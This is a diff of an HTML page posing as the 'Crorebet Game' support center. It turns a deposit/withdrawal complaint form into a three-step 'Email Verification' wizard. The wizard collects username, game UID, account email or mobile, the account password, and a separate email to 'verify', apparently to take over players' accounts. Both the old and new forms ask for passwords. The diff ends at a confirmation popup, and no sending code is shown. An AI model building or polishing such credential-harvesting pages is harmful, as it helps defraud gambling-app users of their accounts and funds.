@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Crorebet Game - Support Center</title>
+<title>Crorebet Game - Email Verification</title>
 <style>
   @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
   * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
@@ -15,20 +15,16 @@
   .nav-bar { padding: 10px 16px 14px; display: flex; align-items: center; justify-content: space-between; }
   .nav-left { display: flex; align-items: center; gap: 10px; }
   .nav-left .svg-icon { color: #f5c518; width: 20px; height: 20px; }
+  .nav-back { width: 36px; height: 36px; border-radius: 50%; background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.15); display: flex; align-items: center; justify-content: center; cursor: pointer; transition: background 0.2s; }
+  .nav-back:hover { background: rgba(255,255,255,0.18); }
+  .nav-back .svg-icon { color: #f5c518; width: 18px; height: 18px; }
   .nav-title { text-align: center; flex: 1; }
   .nav-title h1 { color: #ffffff; font-size: 17px; font-weight: 700; letter-spacing: 0.3px; }
   .nav-title p { color: #f5c518; font-size: 12px; font-weight: 600; margin-top: 2px; letter-spacing: 0.5px; }
   .nav-right { cursor: pointer; padding: 8px; border-radius: 12px; transition: background 0.2s; position: relative; }
   .nav-right:hover { background: rgba(255,255,255,0.08); }
   .nav-right .svg-icon { color: #f5c518; width: 22px; height: 22px; }
-  .tab-container { background: rgba(255,255,255,0.06); border: 1px solid rgba(255,255,255,0.1); margin: 16px 16px 0; border-radius: 14px; padding: 4px; display: flex; position: relative; }
-  .tab-btn { flex: 1; padding: 12px 8px; border: none; background: transparent; font-family: 'Inter', sans-serif; font-size: 13px; font-weight: 600; color: rgba(255,255,255,0.5); cursor: pointer; border-radius: 11px; transition: all 0.35s cubic-bezier(0.4, 0, 0.2, 1); display: flex; align-items: center; justify-content: center; gap: 6px; position: relative; z-index: 2; }
-  .tab-btn .svg-icon { width: 16px; height: 16px; }
-  .tab-btn.active { color: #000000; background: linear-gradient(135deg, #f5c518, #ff8c00); box-shadow: 0 4px 15px rgba(245,197,24,0.3); }
   .form-wrapper { padding: 16px; }
-  .form-section { display: none; }
-  .form-section.active { display: block; }
-  @keyframes fadeSlideIn { from { opacity: 0; transform: translateY(15px) scale(0.98); } to { opacity: 1; transform: translateY(0) scale(1); } }
   .form-card { background: rgba(255,255,255,0.06); border: 1px solid rgba(255,255,255,0.1); border-radius: 16px; padding: 20px; box-shadow: 0 8px 32px rgba(0,0,0,0.3); backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px); }
   .form-card-title { font-size: 13px; font-weight: 600; color: rgba(255,255,255,0.6); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 16px; display: flex; align-items: center; gap: 8px; }
   .form-card-title .svg-icon { color: #f5c518; width: 15px; height: 15px; }
@@ -43,17 +39,6 @@
   .input-field:focus { border-color: #f5c518; background: rgba(255,255,255,0.08); box-shadow: 0 0 0 4px rgba(245,197,24,0.12); }
   .input-field.valid { border-color: #2ecc71; }
   .input-field.invalid { border-color: #e63946; }
-  select.input-field {
-    appearance: none;
-    -webkit-appearance: none;
-    -moz-appearance: none;
-    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='14' height='14' viewBox='0 0 24 24' fill='none' stroke='%23f5c518' stroke-width='2.5' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='m6 9 6 6 6-6'/%3E%3C/svg%3E");
-    background-repeat: no-repeat;
-    background-position: right 16px center;
-    padding-right: 44px;
-    cursor: pointer;
-  }
-  select.input-field option { background: #1d1d30; color: #ffffff; }
   .submit-btn { width: 100%; padding: 16px; border: none; border-radius: 14px; background: linear-gradient(135deg, #f5c518, #ff8c00); color: #000000; font-family: 'Inter', sans-serif; font-size: 16px; font-weight: 700; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; transition: all 0.3s ease; box-shadow: 0 4px 15px rgba(245,197,24,0.3); margin-top: 8px; position: relative; overflow: hidden; }
   .submit-btn:active { transform: scale(0.97); }
   .submit-btn.loading { pointer-events: none; }
@@ -84,6 +69,7 @@
   .auto-close-fill { height: 100%; width: 0%; background: linear-gradient(90deg, #f5c518, #2ecc71); border-radius: 100px; }
   .page { display: none; animation: fadeSlideIn 0.4s ease; }
   .page.active { display: block; }
+  @keyframes fadeSlideIn { from { opacity: 0; transform: translateY(15px) scale(0.98); } to { opacity: 1; transform: translateY(0) scale(1); } }
   .mailbox-header { background: linear-gradient(135deg, #1a1a2e, #0f0f1a); padding: 58px 16px 20px; display: flex; align-items: center; gap: 12px; border-bottom: 1px solid rgba(255,255,255,0.08); }
   .back-btn { width: 36px; height: 36px; border-radius: 50%; background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.15); display: flex; align-items: center; justify-content: center; cursor: pointer; transition: background 0.2s; }
   .back-btn:hover { background: rgba(255,255,255,0.18); }
@@ -125,161 +111,48 @@
   @keyframes confettiFall { 0% { transform: translateY(0) rotate(0deg); opacity: 1; } 100% { transform: translateY(100vh) rotate(720deg); opacity: 0; } }
   .badge { background: #e63946; color: white; font-size: 10px; font-weight: 800; min-width: 18px; height: 18px; border-radius: 9px; display: flex; align-items: center; justify-content: center; padding: 0 5px; position: absolute; top: 4px; right: 4px; animation: popBadge 0.3s ease; }
   @keyframes popBadge { from { transform: scale(0); } to { transform: scale(1); } }
-  @media (max-width: 380px) { .form-card { padding: 16px; } .input-field { padding: 12px 14px; font-size: 14px; } .tab-btn { font-size: 12px; } }
+  .verify-progress { margin-bottom: 24px; }
+  .verify-progress-bar { height: 4px; background: rgba(255,255,255,0.1); border-radius: 100px; overflow: hidden; margin-bottom: 14px; }
+  .verify-progress-fill { height: 100%; width: 0%; background: linear-gradient(90deg, #f5c518, #ff8c00); border-radius: 100px; transition: width 0.45s cubic-bezier(0.4, 0, 0.2, 1); }
+  .verify-steps { display: flex; justify-content: space-between; }
+  .verify-step-label { display: flex; align-items: center; gap: 6px; font-size: 11px; font-weight: 600; color: rgba(255,255,255,0.35); transition: color 0.3s; }
+  .verify-step-label .v-num { width: 20px; height: 20px; border-radius: 50%; background: rgba(255,255,255,0.12); color: rgba(255,255,255,0.5); font-size: 11px; font-weight: 700; display: flex; align-items: center; justify-content: center; transition: all 0.3s; flex-shrink: 0; }
+  .verify-step-label.active { color: #f5c518; }
+  .verify-step-label.active .v-num { background: linear-gradient(135deg, #f5c518, #ff8c00); color: #000000; box-shadow: 0 3px 8px rgba(245,197,24,0.3); }
+  .verify-step-label.done { color: #2ecc71; }
+  .verify-step-label.done .v-num { background: #2ecc71; color: #000000; }
+  .verify-step-content { display: none; }
+  .verify-step-content.active { display: block; }
+  .step-heading { display: flex; align-items: center; gap: 14px; margin-bottom: 20px; padding-bottom: 16px; border-bottom: 1px solid rgba(255,255,255,0.08); }
+  .step-heading-icon { width: 44px; height: 44px; min-width: 44px; border-radius: 12px; background: rgba(245,197,24,0.12); color: #f5c518; display: flex; align-items: center; justify-content: center; }
+  .step-heading-icon .svg-icon { width: 22px; height: 22px; }
+  .step-heading h3 { font-size: 16px; font-weight: 700; color: #ffffff; }
+  .step-heading p { font-size: 12px; color: rgba(255,255,255,0.5); margin-top: 2px; }
+  .verify-method-switch { background: rgba(255,255,255,0.08); border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; padding: 4px; display: flex; margin-bottom: 16px; }
+  .verify-method { flex: 1; padding: 11px 6px; border: none; background: transparent; border-radius: 9px; font-family: 'Inter', sans-serif; font-size: 13px; font-weight: 600; color: rgba(255,255,255,0.5); cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 6px; transition: all 0.3s; }
+  .verify-method .svg-icon { width: 15px; height: 15px; }
+  .verify-method.active { background: linear-gradient(135deg, #f5c518, #ff8c00); color: #000000; box-shadow: 0 3px 10px rgba(245,197,24,0.3); }
+  .btn-row { display: flex; gap: 10px; margin-top: 8px; }
+  .btn-row .back-btn { flex: 0 0 auto; display: inline-flex; align-items: center; gap: 6px; padding: 14px 20px; border-radius: 14px; background: rgba(255,255,255,0.08); border: 1px solid rgba(255,255,255,0.12); color: #ffffff; font-family: 'Inter', sans-serif; font-size: 14px; font-weight: 600; cursor: pointer; transition: all 0.2s; width: auto; }
+  .btn-row .back-btn .svg-icon { width: 16px; height: 16px; color: #ffffff; }
+  .btn-row .back-btn:active { transform: scale(0.97); }
+  .btn-row .submit-btn { flex: 1; margin-top: 0; }
+  .verify-target-card { background: linear-gradient(135deg, rgba(245,197,24,0.08), rgba(255,140,0,0.05)); border: 1.5px dashed rgba(245,197,24,0.4); border-radius: 14px; padding: 22px 18px; text-align: center; margin-bottom: 18px; }
+  .verify-target-icon { width: 56px; height: 56px; margin: 0 auto 12px; border-radius: 50%; background: linear-gradient(135deg, #f5c518, #ff8c00); display: flex; align-items: center; justify-content: center; box-shadow: 0 6px 18px rgba(245,197,24,0.3); }
+  .verify-target-icon .svg-icon { width: 28px; height: 28px; color: #000000; }
+  .verify-target-card h3 { font-size: 16px; font-weight: 700; color: #ffffff; margin-bottom: 6px; }
+  .verify-target-card p { font-size: 12.5px; color: rgba(255,255,255,0.55); line-height: 1.5; }
+  .confirm-popup { padding: 28px 24px 24px; }
+  .confirm-icon { width: 68px; height: 68px; background: linear-gradient(135deg, #f5c518, #ff8c00); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; animation: iconBounce 0.6s ease; box-shadow: 0 8px 25px rgba(245,197,24,0.3); }
+  .confirm-icon .svg-icon { width: 32px; height: 32px; color: #000000; }
+  .confirm-popup .trusted-text { color: rgba(255,255,255,0.5); font-size: 13px; font-weight: 500; margin-bottom: 16px; }
+  .confirm-list { text-align: left; background: rgba(255,255,255,0.04); border-radius: 12px; padding: 6px 14px; margin-bottom: 18px; max-height: 240px; overflow-y: auto; }
+  .confirm-row { display: flex; justify-content: space-between; align-items: center; gap: 12px; padding: 10px 0; border-bottom: 1px solid rgba(255,255,255,0.08); }
+  .confirm-row:last-child { border-bottom: none; }
+  .confirm-row .c-label { font-size: 12px; color: rgba(255,255,255,0.5); font-weight: 500; flex-shrink: 0; }
+  .confirm-row .c-value { font-size: 13px; color: #ffffff; font-weight: 600; text-align: right; max-width: 60%; word-break: break-all; }
+  @media (max-width: 380px) { .form-card { padding: 16px; } .input-field { padding: 12px 14px; font-size: 14px; } }
   ::-webkit-scrollbar { width: 0; }
-
-  /* ===== PAYMENT ISSUE POPUP ===== */
-  .issue-overlay {
-    position: fixed;
-    inset: 0;
-    z-index: 2000;
-    background: rgba(0,0,0,0.6);
-    backdrop-filter: blur(10px);
-    -webkit-backdrop-filter: blur(10px);
-    display: none;
-    align-items: center;
-    justify-content: center;
-    padding: 24px;
-  }
-
-  .issue-overlay.show {
-    display: flex;
-    animation: issueFadeIn 0.3s ease;
-  }
-
-  @keyframes issueFadeIn {
-    from { opacity: 0; }
-    to { opacity: 1; }
-  }
-
-  .issue-modal {
-    width: 100%;
-    max-width: 380px;
-    background: rgba(30,30,50,0.98);
-    border: 1px solid rgba(255,255,255,0.1);
-    border-radius: 24px;
-    padding: 28px 24px 20px;
-    text-align: center;
-    animation: issuePopIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-    box-shadow: 0 20px 60px rgba(0,0,0,0.5);
-  }
-
-  @keyframes issuePopIn {
-    from { opacity: 0; transform: scale(0.85) translateY(20px); }
-    to { opacity: 1; transform: scale(1) translateY(0); }
-  }
-
-  .issue-modal-icon {
-    width: 64px;
-    height: 64px;
-    margin: 0 auto 16px;
-    border-radius: 18px;
-    background: rgba(245,197,24,0.1);
-    border: 1px solid rgba(245,197,24,0.2);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    color: #f5c518;
-  }
-
-  .issue-modal-icon .svg-icon { width: 30px; height: 30px; }
-
-  .issue-modal h3 {
-    font-size: 20px;
-    font-weight: 800;
-    margin-bottom: 6px;
-    color: #ffffff;
-  }
-
-  .issue-modal p {
-    font-size: 13px;
-    color: rgba(255,255,255,0.6);
-    margin-bottom: 22px;
-    line-height: 1.5;
-  }
-
-  .issue-option {
-    display: flex;
-    align-items: center;
-    gap: 14px;
-    width: 100%;
-    padding: 16px;
-    margin-bottom: 12px;
-    border-radius: 16px;
-    border: 1px solid rgba(255,255,255,0.1);
-    background: rgba(255,255,255,0.06);
-    cursor: pointer;
-    font-family: inherit;
-    text-align: left;
-    transition: all 0.25s ease;
-  }
-
-  .issue-option:hover {
-    transform: translateY(-2px);
-    border-color: rgba(245,197,24,0.3);
-  }
-
-  .issue-option:active {
-    transform: scale(0.97);
-  }
-
-  .issue-option-icon {
-    width: 44px;
-    height: 44px;
-    border-radius: 12px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    flex-shrink: 0;
-  }
-
-  .issue-option-icon.deposit {
-    background: rgba(245,197,24,0.12);
-    color: #f5c518;
-  }
-
-  .issue-option-icon.withdrawal {
-    background: rgba(46,204,113,0.12);
-    color: #2ecc71;
-  }
-
-  .issue-option-icon .svg-icon { width: 22px; height: 22px; }
-
-  .issue-option-text { flex: 1; }
-
-  .issue-option-title {
-    font-size: 15px;
-    font-weight: 700;
-    color: #ffffff;
-  }
-
-  .issue-option-sub {
-    font-size: 12px;
-    color: rgba(255,255,255,0.6);
-    margin-top: 2px;
-  }
-
-  .issue-option-arrow {
-    color: rgba(255,255,255,0.35);
-    font-size: 16px;
-    flex-shrink: 0;
-  }
-
-  .issue-cancel {
-    margin-top: 8px;
-    background: none;
-    border: none;
-    color: rgba(255,255,255,0.35);
-    font-size: 13px;
-    font-weight: 600;
-    cursor: pointer;
-    font-family: inherit;
-    padding: 8px 16px;
-  }
-
-  .issue-cancel:hover {
-    color: rgba(255,255,255,0.6);
-  }
 </style>
 </head>
 <body>
@@ -293,20 +166,29 @@
     <rect width="20" height="16" x="2" y="4" rx="2"/>
     <path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/>
   </symbol>
-  <symbol id="icon-arrow-down" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-    <circle cx="12" cy="12" r="10"/>
-    <path d="M12 8v8"/>
-    <path d="m8 12 4 4 4-4"/>
+  <symbol id="icon-badge-check" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+    <path d="M3.85 8.62a4 4 0 0 1 4.78-4.77 4 4 0 0 1 6.74 0 4 4 0 0 1 4.78 4.78 4 4 0 0 1 0 6.74 4 4 0 0 1-4.77 4.78 4 4 0 0 1-6.75 0 4 4 0 0 1-4.78-4.77 4 4 0 0 1 0-6.76Z"/>
+    <path d="m9 12 2 2 4-4"/>
   </symbol>
-  <symbol id="icon-arrow-up" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-    <circle cx="12" cy="12" r="10"/>
-    <path d="M12 16V8"/>
-    <path d="m8 12 4-4 4 4"/>
+  <symbol id="icon-mail-check" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+    <rect width="20" height="16" x="2" y="4" rx="2"/>
+    <path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/>
+    <path d="m9 14 2 2 4-4"/>
   </symbol>
-  <symbol id="icon-info" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-    <circle cx="12" cy="12" r="10"/>
-    <path d="M12 16v-4"/>
-    <path d="M12 8h.01"/>
+  <symbol id="icon-user" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+    <path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"/>
+    <circle cx="12" cy="7" r="4"/>
+  </symbol>
+  <symbol id="icon-id-card" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+    <rect width="20" height="16" x="2" y="4" rx="2"/>
+    <circle cx="8" cy="10" r="2"/>
+    <path d="M14 10h4"/>
+    <path d="M14 14h4"/>
+    <path d="M5.5 15c.6-1.2 1.8-2 3.5-2s2.9.8 3.5 2"/>
+  </symbol>
+  <symbol id="icon-at" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+    <circle cx="12" cy="12" r="4"/>
+    <path d="M16 8v5a3 3 0 0 0 6 0v-1a10 10 0 1 0-4 8"/>
   </symbol>
   <symbol id="icon-phone" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
     <rect width="14" height="20" x="5" y="2" rx="2" ry="2"/>
@@ -316,19 +198,20 @@
     <rect width="18" height="11" x="3" y="11" rx="2" ry="2"/>
     <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
   </symbol>
-  <symbol id="icon-money" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-    <rect width="20" height="12" x="2" y="6" rx="2"/>
-    <circle cx="12" cy="12" r="2"/>
-    <path d="M6 12h.01"/>
-    <path d="M18 12h.01"/>
+  <symbol id="icon-arrow-right" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+    <path d="M5 12h14"/>
+    <path d="m12 5 7 7-7 7"/>
   </symbol>
-  <symbol id="icon-receipt" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-    <path d="M4 2v20l2-1 2 1 2-1 2 1 2-1 2 1 2-1 2 1V2l-2 1-2-1-2 1-2-1-2 1-2-1-2 1Z"/>
-    <path d="M16 8h-6a2 2 0 1 0 0 4h4a2 2 0 1 1 0 4H8"/>
-    <path d="M12 17.5v-11"/>
+  <symbol id="icon-arrow-left" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+    <path d="M19 12H5"/>
+    <path d="m12 19-7-7 7-7"/>
   </symbol>
   <symbol id="icon-chevron-left" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
     <path d="m15 18-6-6 6-6"/>
+  </symbol>
+  <symbol id="icon-send" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+    <path d="M22 2 11 13"/>
+    <path d="M22 2 15 22l-4-9-9-4Z"/>
   </symbol>
   <symbol id="icon-check" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
     <path d="M20 6 9 17l-5-5"/>
@@ -348,22 +231,10 @@
     <polyline points="22 12 16 12 14 15 10 15 8 12 2 12"/>
     <path d="M5.45 5.11 2 12v6a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-6l-3.45-6.89A2 2 0 0 0 16.76 4H7.24a2 2 0 0 0-1.79 1.11z"/>
   </symbol>
-  <symbol id="icon-card" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-    <rect width="20" height="14" x="2" y="5" rx="2"/>
-    <line x1="2" x2="22" y1="10" y2="10"/>
-  </symbol>
-  <symbol id="icon-bank" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-    <polygon points="12 2 20 7 4 7"/>
-    <line x1="3" x2="21" y1="22" y2="22"/>
-    <line x1="6" x2="6" y1="18" y2="11"/>
-    <line x1="10" x2="10" y1="18" y2="11"/>
-    <line x1="14" x2="14" y1="18" y2="11"/>
-    <line x1="18" x2="18" y1="18" y2="11"/>
-  </symbol>
-  <symbol id="icon-arrow-down-circle" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-    <circle cx="12" cy="12" r="10"/>
-    <path d="M12 8v8"/>
-    <path d="m8 12 4 4 4-4"/>
+  <symbol id="icon-clipboard-check" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+    <rect width="8" height="4" x="8" y="2" rx="1" ry="1"/>
+    <path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"/>
+    <path d="m9 14 2 2 4-4"/>
   </symbol>
 </svg>
 
@@ -371,38 +242,90 @@
   <div class="header">
     <div class="status-bar"><span>CROREBET GAME</span></div>
     <div class="nav-bar">
-      <div class="nav-left"><svg class="svg-icon"><use href="#icon-shield"></use></svg></div>
-      <div class="nav-title"><h1>CROREBET GAME</h1><p>Support Center</p></div>
+      <div class="nav-left">
+        <button class="nav-back" onclick="location.href='index.html'"><svg class="svg-icon"><use href="#icon-chevron-left"></use></svg></button>
+        <svg class="svg-icon"><use href="#icon-mail-check"></use></svg>
+      </div>
+      <div class="nav-title"><h1>EMAIL VERIFICATION</h1><p>CroreBet Support Center</p></div>
       <div class="nav-right" onclick="openMailbox()"><svg class="svg-icon"><use href="#icon-mail"></use></svg><span class="badge" id="msgBadge" style="display:none;">0</span></div>
     </div>
   </div>
-  <div class="tab-container">
-    <button class="tab-btn active" onclick="switchTab('deposit')" id="depositTab"><svg class="svg-icon"><use href="#icon-arrow-down"></use></svg> Deposit</button>
-    <button class="tab-btn" onclick="switchTab('withdrawal')" id="withdrawalTab"><svg class="svg-icon"><use href="#icon-arrow-up"></use></svg> Withdrawal</button>
-  </div>
   <div class="form-wrapper">
-    <div class="form-section active" id="depositSection">
-      <div class="form-card">
-        <div class="form-card-title"><svg class="svg-icon"><use href="#icon-info"></use></svg> Deposit Problem — Fill Details</div>
-        <div class="input-group"><div class="input-label"><svg class="svg-icon"><use href="#icon-info"></use></svg><span>Type of Problem</span><span class="required-dot"></span></div><select class="input-field" id="d_issue_type"><option value="" selected>Select problem type</option><option value="Pending">Pending</option><option value="Rejected">Rejected</option><option value="Processing">Processing</option><option value="Declined">Declined</option><option value="Other">Other</option></select></div>
-        <div class="input-group"><div class="input-label"><svg class="svg-icon"><use href="#icon-mail"></use></svg><span>CROREBET GAME Account Email ID</span></div><input type="email" class="input-field" id="d_email" placeholder="Enter your email address" autocomplete="off"></div>
-        <div class="input-group"><div class="input-label"><svg class="svg-icon"><use href="#icon-phone"></use></svg><span>CROREBET GAME Account Mobile No.</span><span class="required-dot"></span></div><input type="tel" class="input-field" id="d_mobile" placeholder="Enter mobile number" maxlength="10" autocomplete="off"></div>
-        <div class="input-group"><div class="input-label"><svg class="svg-icon"><use href="#icon-lock"></use></svg><span>CroreBet Game Account Password</span></div><input type="password" class="input-field" id="d_password" placeholder="Enter your password" autocomplete="off"></div>
-        <div class="input-group"><div class="input-label"><svg class="svg-icon"><use href="#icon-money"></use></svg><span>Deposit Amount</span></div><input type="number" class="input-field" id="d_amount" placeholder="Enter deposit amount" autocomplete="off"></div>
-        <div class="input-group"><div class="input-label"><svg class="svg-icon"><use href="#icon-receipt"></use></svg><span>UTR No.</span></div><input type="text" class="input-field" id="d_utr" placeholder="Enter UTR number" autocomplete="off"></div>
-        <button class="submit-btn" onclick="submitDeposit()" id="depositBtn"><span class="btn-text">Payment Issue</span><div class="spinner"></div></button>
+    <div class="form-card">
+      <div class="form-card-title"><svg class="svg-icon"><use href="#icon-badge-check"></use></svg> Email Verification — 3 Steps</div>
+
+      <div class="verify-progress">
+        <div class="verify-progress-bar"><div class="verify-progress-fill" id="vProgressFill"></div></div>
+        <div class="verify-steps">
+          <div class="verify-step-label active" id="vLabel1"><span class="v-num">1</span> Basic Details</div>
+          <div class="verify-step-label" id="vLabel2"><span class="v-num">2</span> Account Verify</div>
+          <div class="verify-step-label" id="vLabel3"><span class="v-num">3</span> Verify Email</div>
+        </div>
       </div>
-    </div>
-    <div class="form-section" id="withdrawalSection">
-      <div class="form-card">
-        <div class="form-card-title"><svg class="svg-icon"><use href="#icon-info"></use></svg> Withdrawal Problem — Fill Details</div>
-        <div class="input-group"><div class="input-label"><svg class="svg-icon"><use href="#icon-info"></use></svg><span>Type of Problem</span><span class="required-dot"></span></div><select class="input-field" id="w_issue_type"><option value="" selected>Select problem type</option><option value="Pending">Pending</option><option value="Rejected">Rejected</option><option value="Processing">Processing</option><option value="Declined">Declined</option><option value="Other">Other</option></select></div>
-        <div class="input-group"><div class="input-label"><svg class="svg-icon"><use href="#icon-mail"></use></svg><span>CROREBET GAME Account Email ID</span><span class="required-dot"></span></div><input type="email" class="input-field" id="w_email" placeholder="Enter your email address" autocomplete="off"></div>
-        <div class="input-group"><div class="input-label"><svg class="svg-icon"><use href="#icon-phone"></use></svg><span>CROREBET GAME Account Mobile No.</span></div><input type="tel" class="input-field" id="w_mobile" placeholder="Enter mobile number" maxlength="10" autocomplete="off"></div>
-        <div class="input-group"><div class="input-label"><svg class="svg-icon"><use href="#icon-lock"></use></svg><span>CROREBET GAME Account Password</span></div><input type="password" class="input-field" id="w_password" placeholder="Enter your password" autocomplete="off"></div>
-        <div class="input-group"><div class="input-label"><svg class="svg-icon"><use href="#icon-money"></use></svg><span>Withdrawal Amount</span></div><input type="number" class="input-field" id="w_amount" placeholder="Enter withdrawal amount" autocomplete="off"></div>
-        <button class="submit-btn" onclick="submitWithdrawal()" id="withdrawalBtn"><span class="btn-text">Payment Issue</span><div class="spinner"></div></button>
+
+      <div class="verify-step-content active" id="vStep1">
+        <div class="step-heading">
+          <div class="step-heading-icon"><svg class="svg-icon"><use href="#icon-user"></use></svg></div>
+          <div><h3>Basic Details</h3><p>Enter your basic account details</p></div>
+        </div>
+        <div class="input-group">
+          <div class="input-label"><svg class="svg-icon"><use href="#icon-user"></use></svg><span>Username</span><span class="required-dot"></span></div>
+          <input class="input-field" id="v_username" placeholder="Enter your username" autocomplete="off">
+        </div>
+        <div class="input-group">
+          <div class="input-label"><svg class="svg-icon"><use href="#icon-id-card"></use></svg><span>Game UID</span><span class="required-dot"></span></div>
+          <input class="input-field" id="v_uid" placeholder="Enter your game UID" autocomplete="off">
+        </div>
+        <button class="submit-btn" onclick="goVerifyNext(1)"><span class="btn-text">Next Step</span><svg class="svg-icon"><use href="#icon-arrow-right"></use></svg></button>
       </div>
+
+      <div class="verify-step-content" id="vStep2">
+        <div class="step-heading">
+          <div class="step-heading-icon"><svg class="svg-icon"><use href="#icon-lock"></use></svg></div>
+          <div><h3>Account Verification</h3><p>Choose how you want to verify your account</p></div>
+        </div>
+        <div class="verify-method-switch">
+          <button class="verify-method active" id="vMethodEmail" onclick="setVerifyMethod('email')"><svg class="svg-icon"><use href="#icon-at"></use></svg> Email ID</button>
+          <button class="verify-method" id="vMethodMobile" onclick="setVerifyMethod('mobile')"><svg class="svg-icon"><use href="#icon-phone"></use></svg> Mobile Number</button>
+        </div>
+        <div class="input-group" id="vEmailGroup">
+          <div class="input-label"><svg class="svg-icon"><use href="#icon-at"></use></svg><span>Account Email ID</span><span class="required-dot"></span></div>
+          <input type="email" class="input-field" id="v_email" placeholder="Enter your account email" autocomplete="off">
+        </div>
+        <div class="input-group" id="vMobileGroup" style="display:none;">
+          <div class="input-label"><svg class="svg-icon"><use href="#icon-phone"></use></svg><span>Account Mobile No.</span><span class="required-dot"></span></div>
+          <input type="tel" class="input-field" id="v_mobile" placeholder="Enter your mobile number" maxlength="10" autocomplete="off">
+        </div>
+        <div class="input-group">
+          <div class="input-label"><svg class="svg-icon"><use href="#icon-lock"></use></svg><span>Account Password</span><span class="required-dot"></span></div>
+          <input type="password" class="input-field" id="v_password" placeholder="Enter your password" autocomplete="off">
+        </div>
+        <div class="btn-row">
+          <button class="back-btn" onclick="goVerifyBack(1)"><svg class="svg-icon"><use href="#icon-arrow-left"></use></svg> Back</button>
+          <button class="submit-btn" onclick="goVerifyNext(2)"><span class="btn-text">Next Step</span><svg class="svg-icon"><use href="#icon-arrow-right"></use></svg></button>
+        </div>
+      </div>
+
+      <div class="verify-step-content" id="vStep3">
+        <div class="step-heading">
+          <div class="step-heading-icon"><svg class="svg-icon"><use href="#icon-mail-check"></use></svg></div>
+          <div><h3>Verify Your Email</h3><p>Enter the email ID you want to get verified</p></div>
+        </div>
+        <div class="verify-target-card">
+          <div class="verify-target-icon"><svg class="svg-icon"><use href="#icon-badge-check"></use></svg></div>
+          <h3>Email ID to Verify</h3>
+          <p>Fill the email ID below that you want to get verified. Once submitted, our support team will verify it for you.</p>
+        </div>
+        <div class="input-group">
+          <div class="input-label"><svg class="svg-icon"><use href="#icon-mail"></use></svg><span>Email ID to Verify</span><span class="required-dot"></span></div>
+          <input type="email" class="input-field" id="v_verify_email" placeholder="Enter email ID to verify" autocomplete="off">
+        </div>
+        <div class="btn-row">
+          <button class="back-btn" onclick="goVerifyBack(2)"><svg class="svg-icon"><use href="#icon-arrow-left"></use></svg> Back</button>
+          <button class="submit-btn" onclick="submitVerificationComplaint()" id="vSubmitBtn"><span class="btn-text">Payment Issue</span><svg class="svg-icon"><use href="#icon-send"></use></svg></button>
+        </div>
+      </div>
+
     </div>
   </div>
 </div>
@@ -412,43 +335,29 @@
   <div class="mailbox-content" id="mailboxContent"></div>
 </div>
 
+<div class="overlay" id="confirmOverlay">
+  <div class="popup confirm-popup">
+    <div class="confirm-icon"><svg class="svg-icon"><use href="#icon-clipboard-check"></use></svg></div>
+    <h2>Confirm Your Details</h2>
+    <div class="trusted-text">Please review your details before submitting</div>
